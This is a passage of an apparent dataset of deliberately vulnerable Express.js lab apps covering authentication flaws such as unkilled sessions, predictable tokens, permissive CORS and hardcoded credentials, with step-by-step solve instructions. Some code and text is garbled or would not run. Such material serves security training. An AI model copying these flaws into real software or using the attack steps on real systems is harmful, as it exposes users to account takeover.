  "vulnerability_name": "Authentication",
  "src_code": "const express = require('express');\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\napp.post('/exchange', (req, res) => {\n  const providedToken = req.body.token;\n  if (providedToken === 'validToken') {\n    res.json({ token: 'newToken123' });\n  } else {\n    res.json({ token: providedToken });\n  }\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));",
  "lab level": "medium"
},
{
  "lab_scenario": "Autnenticationvulnerability in session termination on logout",
  "lab_description": "This lab simulates a logout process where the session is not properly destroyed, allowing attackers to reuse the session ID after logout.",
  "vulnerability_name": "Authentication",
  "src_code": "const express = require('express');\nconst session = require('express-session');\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\napp.use(session({ secret: 'secret', resave: false, saveUninitialized: true }));\n\napp.post('/login', (req, res) => {\n  req.session.user = req.body.username;\n  res.send('Login successful');\n});\n\napp.post('/logout', (req, res) => {\n  // Vulnerable: session is not destroyed\n  res.send('Logged out');\n});\n\napp.get('/dashboard', (req, res) => {\n  if (req.session.user) res.send(Welcome, ${req.session.user});\n  else res.send('Please log in');\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));",
  "lab level": "hard"
},
{
  "Lab scenario": "Weak Hash-Based AutnenticationTokens",
  "Lab Description": "This lab uses weak hash-based Autnenticationtokens generated with a static salt and MD5 hashing. The token format is MD5(username + 'secret123'). Attackers can compute valid tokens for other users if they know the salt. To solve the lab, compute the Autnenticationtoken for the 'admin' user and access their profile.",
  "Vulnerability name": "Authentication",
  "lab level": "medium",
  "src code": "const express = require('express'); const crypto = require('crypto'); const app = express(); const users = [{ username: 'user', password: 'password123' }, { username: 'admin', password: 'admin456' }]; const SALT = 'secret123'; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const token = crypto.createHash('md5').update(user.username + SALT).digest('hex'); res.cookie('authToken', token); res.send('Welcome, ' + username); }); app.get('/profile', (req, res) => { const authToken = req.cookies.authToken; const user = users.find(u => crypto.createHash('md5').update(u.username + SALT).digest('hex') === authToken); if (!user) return res.status(401).send('Unauthorized'); res.send('Profile for ' + user.username); }); const PORT = 4000; app.listen(PORT, () => console.log('Weak Token Generation Lab running on http://localhost:' + PORT));"
},
{
  "Lab scenario": "Bypass Session Termination via Stale Password Hash Validation",
  "Lab Description": "This lab's Autnenticationsystem fails to invalidate existing sessions after password changes, allowing attackers to maintain persistent access using old credentials. To solve the lab: 1. Authenticate with Carlos's credentials (user: carlos, password: Summer2024). 2. Change Carlos's password while preserving your active session. 3. Use the original session cookie to access the /admin/export endpoint and download sensitive financial records. The system only validates sessions against initial password hashes, not current credentials.",
  "Vulnerability name": "Authentication",
  "lab level": "hard",
  "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst crypto = require('crypto');\nconst app = express();\napp.use(bodyParser.json());\n\nconst users = [{\n  username: 'carlos',\n  passwordHash: crypto.createHash('sha256').update('Summer2024').digest('hex'),\n  isAdmin: true\n}];\n\nconst sessions = new Map();\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const user = users.find(u => u.username === username);\n  \n  if (!user || user.passwordHash !== crypto.createHash('sha256').update(password).digest('hex')) {\n    return res.status(401).send('Invalid credentials');\n  }\n\n  const sessionId = crypto.randomBytes(16).toString('hex');\n  sessions.set(sessionId, {\n    username: user.username,\n    passwordHash: user.passwordHash // Storing password hash at time of login\n  });\n\n  res.cookie('session', sessionId, { httpOnly: true });\n  res.send('Logged in successfully');\n});\n\napp.post('/change-password', (req, res) => {\n  const sessionId = req.cookies.session;\n  const { newPassword } = req.body;\n  \n  if (!sessions.has(sessionId)) return res.status(401).send('Unauthorized');\n  \n  const user = users.find(u => u.username === sessions.get(sessionId).username);\n  user.passwordHash = crypto.createHash('sha256').update(newPassword).digest('hex');\n  \n  // Critical flaw: Doesn't update existing sessions' passwordHash\n  res.send('Password changed successfully');\n});\n\napp.get('/admin/export', (req, res) => {\n  const sessionId = req.cookies.session;\n  const session = sessions.get(sessionId);\n  \n  if (!session) return res.status(401).send('Unauthorized');\n  \n  const user = users.find(u => u.username === session.username);\n  \n  // Vulnerability: Only checks initial password hash, not current\n  if (session.passwordHash === user.passwordHash && user.isAdmin) {\n    res.send('ADMIN DATA: All financial records downloaded');\n  } else {\n    res.status(403).send('Admin access required');\n  }\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`Session Lab running on http://localhost:${PORT}`));"
},
{
  "Lab scenario": "Exploit a weak password reset mechanism to access the admin account.",
  "Lab Description": "The application features a password reset mechanism that generates a reset token identical to the username. This design flaw allows an attacker to reset any user's password simply by knowing their username and using it as the token. In this lab, there is an admin user with the username 'admin'. To solve the lab, follow these steps: 1. Request a password reset for the user 'attacker'. 2. Observe the reset link provided (e.g., '/reset?token=attacker'). 3. Modify the token in the URL to 'admin' (e.g., '/reset?token=admin'). 4. Reset the admin's password to a new value of your choice. 5. Log in as 'admin' using the new password to gain access. This lab demonstrates how predictable tokens can lead to unauthorized access, emphasizing the importance of secure token generation in Autnenticationsystems.",
  "Vulnerability name": "Authentication",
  "lab level": "easy",
  "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\nlet users = { 'attacker': 'attackerpass', 'admin': 'adminpass' };\n\napp.get('/login', (req, res) => {\n  res.send('<form method=\"post\"><input name=\"username\" placeholder=\"Username\"><input name=\"password\" type=\"password\" placeholder=\"Password\"><button type=\"submit\">Login</button></form>');\n});\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (users[username] && users[username] === password) {\n    res.send(`Welcome, ${username}!`);\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\napp.get('/forgot', (req, res) => {\n  res.send('<form method=\"post\"><input name=\"username\" placeholder=\"Username\"><button type=\"submit\">Request reset</button></form>');\n});\n\napp.post('/forgot', (req, res) => {\n  const { username } = req.body;\n  if (users[username]) {\n    const resetLink = `/reset?token=${username}`;\n    res.send(`Reset link: <a href=\"${resetLink}\">${resetLink}</a>`);\n  } else {\n    res.status(404).send('User not found');\n  }\n});\n\napp.get('/reset', (req, res) => {\n  const { token } = req.query;\n  if (!token || !users[token]) {\n    res.status(400).send('Invalid token');\n  } else {\n    res.send(`<form method=\"post\"><input name=\"token\" type=\"hidden\" value=\"${token}\"><input name=\"new_password\" type=\"password\" placeholder=\"New Password\"><button type=\"submit\">Reset password</button></form>`);\n  }\n});\n\napp.post('/reset', (req, res) => {\n  const { token, new_password } = req.body;\n  if (users[token]) {\n    users[token] = new_password;\n    res.send('Password reset successfully');\n  } else {\n    res.status(400).send('Invalid token');\n  }\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`Insecure Password Reset Lab running on http://localhost:${PORT}`));"
},
{
  "Lab scenario": "Bypass Certificate-Based Autnenticationvia Forged Client-Side TLS Verification",
  "Lab Description": "This lab implements flawed certificate pinning where client certificate validation only checks the public key rather than full certificate chain. Attackers can forge certificates using extracted public keys to impersonate administrators. To solve the lab: 1. Obtain the server's pinned public key from /security.txt. 2. Generate a malicious certificate matching the public key. 3. Authenticate using the forged certificate to access the /audit/reports endpoint and delete all audit logs.",
  "Vulnerability name": "Authentication",
  "lab level": "hard",
  "src code": "const express = require('express');\nconst fs = require('fs');\nconst spdy = require('spdy');\nconst app = express();\n\n// Server configuration\nconst pinnedPublicKey = fs.readFileSync('./pinned-key.pub', 'utf8');\nconst authorizedUsers = ['CN=admin'];\n\n// Vulnerable TLS middleware\napp.use((req, res, next) => {\n  const cert = req.socket.getPeerCertificate();\n  \n  if (!cert || !cert.raw) {\n    return res.status(401).send('Client certificate required');\n  }\n\n  // Critical flaw: Only compares public keys\n  const clientPublicKey = cert.publicKey.export({ type: 'spki', format: 'pem' });\n  if (clientPublicKey !== pinnedPublicKey) {\n    return res.status(403).send('Invalid certificate');\n  }\n\n  // Secondary flaw: Subject validation bypass\n  req.isAdmin = cert.subject.CN === 'admin';\n  next();\n});\n\napp.get('/audit/reports', (req, res) => {\n  if (!req.isAdmin) return res.status(403).send('Admin required');\n  res.send('AUDIT CONTROLS: <button onclick=\"fetch('/audit/purge')\">DELETE ALL</button>');\n});\n\napp.post('/audit/purge', (req, res) => {\n  res.send('All audit logs destroyed - Lab solved');\n});\n\n// Expose public key (simulate security misconfiguration)\napp.get('/security.txt', (req, res) => {\n  res.send(pinnedPublicKey);\n});\n\nspdy.createServer({\n  key: fs.readFileSync('./server.key'),\n  cert: fs.readFileSync('./server.crt'),\n  requestCert: true,\n  rejectUnauthorized: false // Critical: Accepts self-signed certs\n}, app).listen(4000, () => {\n  console.log(`Certificate Lab running on https://localhost:4000`);\n});"
},
{
  "Lab scenario": "Predictable Cookie-Based Session Hijacking",
  "Lab Description": "This lab uses a predictable cookie value derived from the username to authenticate users. The cookie format is 'user-<username>'. Attackers can impersonate other users by knowing their usernames and constructing the corresponding cookie value. To solve the lab, access another user's profile by manipulating the cookie value.",
  "Vulnerability name": "Authentication",
  "lab level": "medium",
  "src code": "const express = require('express'); const app = express(); const users = [{ username: 'alice', password: 'password123' }, { username: 'bob', password: 'password456' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); // Set predictable cookie res.cookie('auth', 'user-' + user.username); res.send('Welcome, ' + username); }); app.get('/profile', (req, res) => { const authCookie = req.cookies.auth; if (!authCookie) return res.status(401).send('Unauthorized'); const parts = authCookie.split('-'); if (parts[0] !== 'user' || parts.length !== 2) return res.status(401).send('Invalid cookie'); const username = parts[1]; const user = users.find(u => u.username === username); if (!user) return res.status(401).send('Unauthorized'); res.send('Profile for ' + username); }); const PORT = 4000; app.listen(PORT, () => console.log('Predictable Cookie Lab running on http://localhost:' + PORT));"
},
{
  "Lab scenario": "Exploit a web application with a weak password policy that allows users to set very short or predictable passwords, making them easy to guess.",
  "Lab Description": "The application has a login page where users can authenticate with a username and password. However, it enforces no minimum password length or complexity requirements. This allows an attacker to guess the password of a user by trying common or short passwords, such as '123' or 'password'. Your task is to: 1. Attempt to log in as the user 'admin' by guessing their password. 2. Use simple, common passwords (e.g., 'admin', '123', or 'pass') until you succeed. 3. Once logged in, access the protected '/dashboard' page to confirm the exploit. This lab demonstrates the importance of enforcing strong password policies (e.g., minimum length, mix of characters) to prevent attackers from easily guessing credentials. Hint: Try short or predictable passwords that someone might use if no rules are enforced.",
  "Vulnerability name": "Authentication",
  "lab level": "easy",
  "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst users = { 'admin': '123' }; // Weak password!\n\napp.get('/login', (req, res) => {\n  res.send('<form method=\"post\"><input name=\"username\" placeholder=\"Username\"><br><input name=\"password\" type=\"password\" placeholder=\"Password\"><br><button type=\"submit\">Login</button></form>');\n});\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (users[username] && users[username] === password) {\n    res.send('Login successful! <a href=\"/dashboard\">Go to Dashboard</a>');\n  } else {\n    res.status(401).send('Invalid username or password');\n  }\n});\n\napp.get('/dashboard', (req, res) => {\n  res.send('Welcome to the Admin Dashboard!');\n});\n\nconst PORT = 5000;\napp.listen(PORT, () => console.log(`Weak Password Policy Lab running on http://localhost:${PORT}`));"
},
{
  "Lab scenario": "Bypass FIDO2 Autnenticationvia Forged Attestation Statements",
  "Lab Description": "This lab's WebAuthn implementation fails to properly validate authenticator attestation data, allowing attackers to register malicious security keys as admin devices. To solve: 1. Intercept WebAuthn registration traffic. 2. Forge attestation statement using software emulated authenticator. 3. Bypass admin privilege checks by manipulating credential ID format. 4. Access /control-panel to disable security systems.",
  "Vulnerability name": "Authentication",
  "lab level": "hard",
  "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst { WebAuthn } = require('node-webauthn');\nconst app = express();\napp.use(bodyParser.json());\n\nconst webauthn = new WebAuthn({\n  rpName: 'Vulnerable Corp',\n  rpID: 'localhost',\n  origin: 'http://localhost:4000',\n  attestation: 'direct',\n  // Critical flaw: No attestation format validation\n  supportedAlgorithmIDs: [-7, -257]\n});\n\nconst users = [{\n  id: 'admin',\n  credentials: [],\n  role: 'user'\n}];\n\napp.post('/webauthn/register', async (req, res) => {\n  const options = webauthn.generateRegistrationOptions({\n    userID: 'attacker',\n    userName: 'attacker',\n    // Vulnerability: Accepts any authenticator type\n    authenticatorSelection: { userVerification: 'discouraged' }\n  });\n\n  req.session.challenge = options.challenge;\n  res.json(options);\n});\n\napp.post('/webauthn/register/complete', async (req, res) => {\n  const result = await webauthn.verifyRegistration({\n    credential: req.body,\n    expectedChallenge: req.session.challenge,\n    expectedOrigin: 'http://localhost:4000',\n    // Critical flaw: Disabled attestation verification\n    requireUserVerification: false\n  });\n\n  // Vulnerability: Privilege escalation via credential ID pattern\n  if (result.credentialID.toString('hex').startsWith('admin')) {\n    users[0].role = 'admin';\n  }\n\n  res.send('Registration successful');\n});\n\napp.get('/control-panel', (req, res) => {\n  if (users[0].role !== 'admin') return res.status(403).send('Access denied');\n  res.send('SECURITY CONTROLS: <button onclick=\"fetch('/shutdown')\">DISABLE ALL</button>');\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`WebAuthn Lab running on http://localhost:${PORT}`));"
},
{
  "Lab scenario": "Steal OAuth Tokens through Promiscuous CORS Configuration",
  "Lab Description": "This lab's OAuth provider has insecure CORS settings allowing arbitrary origins to retrieve access tokens. Exploit: 1. Lure victim to malicious site loading cross-origin iframe. 2. Use XHR from attacker.com to /oauth/userinfo. 3. Exfiltrate tokens via DNS prefetch. 4. Access /api/admin to revoke all 2FA settings. The lab uses refresh_token grant with long-lived tokens.",
  "Vulnerability name": "Authentication",
  "lab level": "hard",
  "src code": "const express = require('express');\nconst cors = require('cors');\nconst app = express();\n\napp.use(cors({\n  // Critical flaw: Reflects arbitrary origin with credentials\n  origin: (origin, callback) => callback(null, true),\n  credentials: true\n}));\n\nconst tokens = new Map();\ntokens.set('admin_token', { \n  user: 'admin',\n  scope: ['admin'],\n  expires: Date.now() + 31536000000 // 1 year expiration\n});\n\napp.get('/oauth/userinfo', (req, res) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  const session = tokens.get(token);\n  \n  if (!session) return res.status(401).send('Invalid token');\n  res.json({\n    user: session.user,\n    scope: session.scope,\n    // Vulnerability: Returns sensitive metadata\n    security: { 2fa_enabled: false }\n  });\n});\n\napp.post('/api/admin/disable-2fa', (req, res) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  if (!tokens.get(token)?.scope.includes('admin')) {\n    return res.status(403).send('Admin required');\n  }\n  res.send('All 2FA disabled - Lab solved');\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`CORS Lab running on http://localhost:${PORT}`));"
},
{
  "Lab scenario": "Exploit a weak password policy to guess a user's password.",
  "Lab Description": "The application enforces a weak password policy that allows very short and simple passwords (e.g., minimum 3 characters, no complexity requirements). Your task is to guess the password for the user 'user1' and log into their account. Hint: The password is a common three-letter word.",
  "Vulnerability name": "Authentication",
  "lab level": "easy",
  "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\n// Simulated database with user credentials\nconst users = { 'user1': 'cat', 'admin': 'dog' };\n\n// Serve the login page\napp.get('/login', (req, res) => {\n  res.send('<form method=\"post\"><input name=\"username\" placeholder=\"Username\"><input name=\"password\" type=\"password\" placeholder=\"Password\"><button type=\"submit\">Login</button></form>');\n});\n\n// Handle login attempts\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (users[username] && users[username] === password) {\n    res.send(`Welcome, ${username}!`);\n  } else {\n    res.status(401).send('Login failed');\n  }\n});\n\nconst PORT = 8000;\napp.listen(PORT, () => console.log(`Weak Password Policy Lab running on http://localhost:${PORT}`));"
},
{
  "Lab scenario": "Exploit hardcoded credentials to log in as an admin user.",
  "Lab Description": "The application contains hardcoded credentials embedded in its source code. Your task is to examine the code, identify the admin username and password, and use them to log in. Once successful, you'll see a welcome message confirming your access as an admin.",
  "Vulnerability name": "Authentication",
  "lab level": "easy",
  "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\n// hardcoded admin credentials\nconst ADMIN_USERNAME = 'admin';\nconst ADMIN_PASSWORD = 'secret123';\n\n// Serve the login page\napp.get('/login', (req, res) => {\n  res.send('<form method=\"post\"><input name=\"username\" placeholder=\"Username\"><input name=\"password\" type=\"password\" placeholder=\"Password\"><button type=\"submit\">Login</button></form>');\n});\n\n// Handle login attempts\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {\n    res.send(`Welcome, ${username}! You have admin access.`);\n  } else {\n    res.status(401).send('Login failed: Incorrect username or password');\n  }\n});\n\nconst PORT = 9000;\napp.listen(PORT, () => console.log(`hardcoded Credentials Lab running on http://localhost:${PORT}`));"
},
{
  "Lab scenario": "Unauthorized File Access via IDOR",
  "Lab Description": "This lab allows attackers to download sensitive files by manipulating the file ID parameter in the download endpoint. The application does not validate whether the user is authorized to access the requested file. To solve the lab, download a restricted file by guessing its ID.",
  "Vulnerability name": "Authentication",
  "lab level": "medium",
  "src code": "const express = require('express'); const app = express(); const files = { 1: { id: 1, name: 'user1_file.txt', content: 'User 1 data' }, 2: { id: 2, name: 'admin_file.txt', content: 'Admin data' } }; app.get('/download/:fileId', (req, res) => { const fileId = parseInt(req.params.fileId); const file = files[fileId]; if (!file) return res.status(404).send('File not found'); res.send(file.content); }); const PORT = 4000; app.listen(PORT, () => console.log('IDOR File Download Lab running on http://localhost:' + PORT));"
},
{
  "Lab scenario": "Session Reuse After Logout",
  "Lab Description": "This lab's logout functionality does not properly invalidate the session, allowing attackers to reuse the session cookie even after the user has logged out. To solve the lab, intercept the session cookie, force the user to log out, then use the same cookie to access their account.",
  "Vulnerability name": "Authentication",
  "lab level": "medium",
  "src code": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'secret', resave: false, saveUninitialized: true })); app.post('/login', (req, res) => { req.session.user = 'alice'; res.send('Logged in'); }); app.post('/logout', (req, res) => { // Vulnerability: Session not invalidated req.session.user = null; res.send('Logged out'); }); app.get('/profile', (req, res) => { if (req.session.user) res.send('Welcome, alice!'); else res.status(401).send('Unauthorized'); }); const PORT = 4000; app.listen(PORT, () => console.log('Session Reuse Lab running on http://localhost:' + PORT));"
},
{
  "Lab scenario": "Session ID Predictability via User Email",
  "Lab Description": "This lab generates session IDs using the user's email address (e.g., 'session-' + email). Attackers can impersonate users by knowing their email and constructing the corresponding session ID. To solve the lab, access another user's profile using their email-derived session ID.",
  "Vulnerability name": "Authentication",
  "lab level": "medium",
  "src code": "const express = require('express'); const app = express(); const users = [{ email: 'user@example.com', password: 'password123' }, { email: 'admin@example.com', password: 'admin456' }]; app.post('/login', (req, res) => { const { email, password } = req.body; const user = users.find(u => u.email === email && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); res.cookie('session', 'session-' + user.email); res.send('Welcome!'); }); app.get('/profile', (req, res) => { const session = req.cookies.session; const user = users.find(u => 'session-' + u.email === session); if (!user) return res.status(401).send('Unauthorized'); res.send('Profile for ' + user.email); }); const PORT = 4000; app.listen(PORT, () => console.log('Predictable Session ID Lab running on http://localhost:' + PORT));"
},
{
  "Lab scenario": "Unauthorized Email Update via API",
  "Lab Description": "This lab's API endpoint allows attackers to update any user's email by including the target user's ID in the request body. The backend does not validate authorization. To solve the lab, change another user's email using their ID.",
  "Vulnerability name": "Authentication",
  "lab level": "medium",
  "src code": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ id: 1, email: 'user@example.com' }, { id: 2, email: 'admin@example.com' }]; app.post('/update-email', (req, res) => { const { userId, newEmail } = req.body; const user = users.find(u => u.id === userId); if (!user) return res.status(404).send('User not found'); user.email = newEmail; res.send('Email updated to ' + newEmail); }); const PORT = 4000; app.listen(PORT, () => console.log('Missing Authorization Lab running on http://localhost:' + PORT));"
},
{
  "Lab scenario": "Brute-Forceable Session IDs",
  "Lab Description": "This lab uses a weak random number generator (Math.random()) to create 4-digit session IDs. Attackers can brute-force all possible IDs (0000-9999) to hijack sessions. To solve the lab, iterate through session IDs to find an active one.",
  "Vulnerability name": "Authentication",
  "lab level": "medium",
  "src code": "const express = require('express'); const app = express(); let sessionId = Math.floor(Math.random() * 9000) + 1000; // 4-digit ID app.get('/profile', (req, res) => { const userSession = req.query.session; if (userSession === sessionId.toString()) { res.send('Welcome! Active session: ' + sessionId); } else { res.status(401).send('Unauthorized'); } }); const PORT = 4000; app.listen(PORT, () => console.log('Weak Randomness Lab running on http://localhost:' + PORT));"
},
{
  "Lab scenario": "Hijack SAML Flows via Assertion Consumer Service Manipulation",
  "Lab Description": "This lab's SAML IdP doesn't invalidate used assertions, allowing replay attacks. To solve: 1. Initiate SP-initiated SSO to capture SAMLRequest. 2. Modify `AssertionConsumerServiceURL` to attacker endpoint. 3. Replay assertion via original ACS URL. 4. Access /partner/data as federated admin.",
  "Vulnerability name": "Authentication",
  "lab level": "hard",
  "src code": "const express = require('express');\nconst xmlCrypto = require('xml-crypto');\nconst xmldom = require('xmldom');\nconst xpath = require('xpath');\nconst app = express();\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/saml/acs', (req, res) => {\n  try {\n    const SAMLResponse = Buffer.from(req.body.SAMLResponse, 'base64').toString();\n    const doc = new xmldom.DOMParser().parseFromString(SAMLResponse);\n    \n    // Extract assertion with XPath\n    const select = xpath.useNamespaces({\n      saml: 'urn:oasis:names:tc:SAML:2.0:assertion',\n      ds: 'http://www.w3.org/2000/09/xmldsig#'\n    });\n    \n    const assertion = select('//saml:Assertion', doc)[0];\n    const signature = select('//ds:Signature', doc)[0];\n\n    // Verify signature\n    const verifier = new xmlCrypto.SignedXml({ signatureAlgorithm: 'rsa-sha256' });\n    verifier.loadSignature(signature.toString());\n    \n    if (!verifier.checkSignature(assertion.toString())) {\n      return res.status(403).send('Invalid signature');\n    }\n\n    // Vulnerability: No assertion replay prevention\n    res.redirect('/partner/data');\n  } catch (error) {\n    res.status(500).send('SAML processing error');\n  }\n});\n\napp.get('/partner/data', (req, res) => {\n  res.send('FEDERATED DATA: Cross-tenant customer records');\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`SAML Replay Lab running on http://localhost:${PORT}`));"
},
{
  "Lab scenario": "Predict HMAC-Based One-Time Passwords via State Manipulation",
  "Lab Description": "This lab's 2FA system uses a flawed HMAC-SHA256 implementation where the nonce isn't properly randomized. Attackers can: 1. Capture two consecutive OTPs. 2. Reverse-engineer the HMAC key using length extension attacks. 3. Generate future OTPs to access /admin/backup. The nonce increments by 1 second but resets during password changes.",
  "Vulnerability name": "Authentication",
  "lab level": "hard",
  "src code": "const crypto = require('crypto');\nconst express = require('express');\nconst app = express();\n\nlet hmacKey = crypto.randomBytes(32);\nlet nonce = Date.now();\n\napp.post('/2fa', (req, res) => {\n  const { code } = req.body;\n  const currentNonce = Math.floor(Date.now() / 1000);\n  \n  // Critical flaw: Reusable nonce window\n  const validCodes = [currentNonce - 1, currentNonce, currentNonce + 1]\n    .map(t => crypto.createHmac('sha256', hmacKey).update(t.toString()).digest('hex'));\n  \n  if (!validCodes.includes(code)) return res.status(401).send('Invalid code');\n  res.send('Admin dashboard unlocked');\n});\n\napp.post('/change-password', (req, res) => {\n  // Vulnerability: Resets nonce but preserves HMAC key\n  nonce = Date.now();\n  res.send('Password changed');\n});\n\napp.get('/admin/backup', (req, res) => {\n  res.send('SYSTEM BACKUP: Cryptographic keys archived');\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`OTP Lab running on http://localhost:${PORT}`));"
},
{
  "Lab scenario": "Steal Identity Tokens via OpenID Connect Misconfiguration",
  "Lab Description": "This lab's OIDC implementation fetches JWKS keys from an attacker-controlled URL due to insecure `issuer` validation. Exploit: 1. Register a malicious OAuth client with `redirect_uri=http://attacker.com`. 2. Forge JWT with `iss` pointing to your server. 3. Capture the server's HTTP request to your JWKS endpoint containing privileged `kid` tokens. 4. Use leaked tokens to access /vault and decrypt secrets.",
  "Vulnerability name": "Authentication",
  "lab level": "hard",
  "src code": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst axios = require('axios');\nconst app = express();\n\nconst clients = [{\n  client_id: 'legacy-app',\n  jwks_uri: 'https://metadata.google.com/.well-known/jwks.json' // Default trusted\n}];\n\napp.post('/oauth/token', async (req, res) => {\n  const { assertion } = req.body;\n  const decoded = jwt.decode(assertion, { complete: true });\n  \n  // Critical flaw: Blindly trusts JWT `iss` claim\n  const client = clients.find(c => c.client_id === decoded.payload.iss);\n  const jwks = (await axios.get(client.jwks_uri)).data;\n  \n  // Vulnerability: No host validation for JWKS_URI\n  const key = jwks.keys.find(k => k.kid === decoded.header.kid);\n  const verified = jwt.verify(assertion, pemKey(key), { algorithms: ['RS256'] });\n  \n  res.json({ access_token: 'leaked_system_token' });\n});\n\napp.get('/vault', (req, res) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  if (token !== 'leaked_system_token') return res.status(403);\n  res.send('VAULT UNLOCKED: Root certificates extracted');\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`OIDC Lab running on http://localhost:${PORT}`));"
},
{
  "Lab scenario": "Predictable Reset Tokens Using Timestamps",
  "Lab Description": "This lab generates password reset tokens using the current timestamp plus a fixed offset (e.g., 'token-' + (Date.now() + 10000)). Attackers can predict tokens by knowing when they were generated. To solve the lab, compute the reset token for the 'admin' account using the approximate timestamp.",
  "Vulnerability name": "Authentication",
  "lab level": "medium",
  "src code": "const express = require('express'); const app = express(); const users = { 'admin': { password: 'admin123', resetToken: null } }; app.post('/request-reset', (req, res) => { const { username } = req.body; const user = users[username]; if (!user) return res.status(404).send('User not found'); const timestamp = Date.now(); user.resetToken = 'token-' + (timestamp + 10000); res.send('Reset token generated'); }); app.post('/reset-password', (req, res) => { const { username, token, newPassword } = req.body; const user = users[username]; if (!user || user.resetToken !== token) return res.status(401).send('Invalid token'); user.password = newPassword; user.resetToken = null; res.send('Password reset'); }); const PORT = 4000; app.listen(PORT, () => console.log('Timestamp Token Lab running on http://localhost:' + PORT));"
},
{
  "Lab scenario": "Unauthorized Role Modification",
  "Lab Description": "This lab allows attackers to escalate privileges by modifying the 'role' parameter in API requests. The backend does not validate if the user is authorized to change roles. To solve the lab, change your role to 'admin' by tampering with the request.",
  "Vulnerability name": "Authentication",
  "lab level": "medium",
  "src code": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ id: 1, role: 'user' }, { id: 2, role: 'admin' }]; app.post('/update-role', (req, res) => { const { userId, newRole } = req.body; const user = users.find(u => u.id === userId); if (!user) return res.status(404).send('User not found'); user.role = newRole; res.send('Role updated to ' + newRole); }); const PORT = 4000; app.listen(PORT, () => console.log('Role Escalation Lab running on http://localhost:' + PORT));"
},
{
  "Lab scenario": "Session ID Exposed in URL",
  "Lab Description": "This lab stores the session ID in the URL instead of a secure cookie. Attackers can steal session IDs from server logs or shared URLs. To solve the lab, intercept another user's session ID from their URL and access their profile.",
  "Vulnerability name": "Authentication",
  "lab level": "medium",
  "src code": "const express = require('express'); const app = express(); let sessionId = 'abc123'; app.get('/profile', (req, res) => { const userSession = req.query.session; if (userSession === sessionId) { res.send('Welcome! Active session: ' + sessionId); } else { res.status(401).send('Unauthorized'); } }); app.get('/login', (req, res) => { res.send(`Logged in. Your session ID is: ${sessionId}`); }); const PORT = 4000; app.listen(PORT, () => console.log('URL Session ID Lab running on http://localhost:' + PORT));"
},
{
  "Lab scenario": "Privilege Escalation via PAR Request URI Manipulation",
  "Lab Description": "This OAuth 2.1 implementation mishandles Pushed Authorization Request URIs, allowing attackers to: 1. Intercept `request_uri` during client registration. 2. Replace scopes with `admin:full`. 3. Force authorization server to process modified request. 4. Access SCIM API to create backdoor admin account.",
  "Vulnerability name": "Authentication",
  "lab level": "hard",
  "src code": "const express = require('express');\nconst uuid = require('uuid');\nconst app = express();\n\nconst parRequests = new Map();\n\napp.post('/par', (req, res) => {\n  const { client_id, scope } = req.body;\n  const request_uri = `urn:ietf:params:oauth:request_uri:${uuid.v4()}`;\n  \n  // Critical flaw: No client-scope binding\n  parRequests.set(request_uri, {\n    client_id,\n    scope // Vulnerable: Attacker can override\n  });\n  \n  res.json({ request_uri, expires_in: 300 });\n});\n\napp.post('/authorize', (req, res) => {\n  const { request_uri } = req.body;\n  const request = parRequests.get(request_uri);\n  \n  // Vulnerability: Trusts unmodified PAR\n  if (request.scope.includes('admin:full')) {\n    res.redirect(`/scim/create-admin?client=${request.client_id}`);\n  } else {\n    res.send('Standard authorization granted');\n  }\n});\n\napp.post('/scim/create-admin', (req, res) => {\n  res.send('Backdoor admin created - Lab solved');\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`PAR Lab running on http://localhost:${PORT}`));"
},
{
  "Lab scenario": "Bypass Facial Recognition via Stored Template Reuse",
  "Lab Description": "This lab's biometric Autnenticationsystem stores facial recognition templates as static SHA-256 hashes. Attackers can: 1. Extract template hashes from insecure S3 bucket. 2. Replay admin's facial hash via API parameter. 3. Bypass liveness detection to access /biometric/safe. The system compares hashes without timestamp validation.",
  "Vulnerability name": "Authentication",
  "lab level": "hard",
